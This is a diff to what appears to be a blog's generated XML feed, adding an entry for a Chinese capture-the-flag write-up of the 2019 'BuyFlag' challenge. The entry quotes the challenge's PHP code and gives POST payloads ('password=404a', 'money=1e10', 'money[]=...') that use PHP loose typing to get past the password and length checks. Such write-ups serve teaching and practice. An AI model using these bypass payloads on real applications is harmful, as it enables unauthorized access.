@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>极客大挑战:2019-BuyFlag</title>
+      <link href="2021/06/14/ji-ke-da-tiao-zhan-2019-buyflag/"/>
+      <url>2021/06/14/ji-ke-da-tiao-zhan-2019-buyflag/</url>
+      
+        <content type="html"><![CDATA[<p><img src="/2021/06/14/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614223645887.png" alt="image-20210614223645887"></p><p><img src="/2021/06/14/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614223700776.png" alt="image-20210614223700776"></p><p>点击menu看到这个：</p><p><img src="/2021/06/14/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614223729634.png" alt="image-20210614223729634"></p><p><img src="/2021/06/14/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614224001121.png" alt="image-20210614224001121"></p><p>查看源码：</p><pre><code>    ~~~post money and password~~~if (isset($_POST['password'])) {    $password = $_POST['password'];    if (is_numeric($password)) {        echo "password can't be number&lt;/br&gt;";    }elseif ($password == 404) {        echo "Password Right!&lt;/br&gt;";    }}</code></pre><p>所以要post：money=100000000和password=404但是password不能为数字</p><p>应用到PHP弱类型：</p><pre><code>money=100000000&amp;password=404a</code></pre><p>长度超了</p><pre><code>money=1e10&amp;password=404a</code></pre><pre><code>money[]=100000000&amp;password=404a</code></pre><p><img src="/2021/06/14/ji-ke-da-tiao-zhan-2019-buyflag/image-20210614232002000.png" alt="image-20210614232002000"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> PHP弱类型 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>HCTF:2018-admin</title>
       <link href="2021/06/12/hctf-2018-admin/"/>
       <url>2021/06/12/hctf-2018-admin/</url>
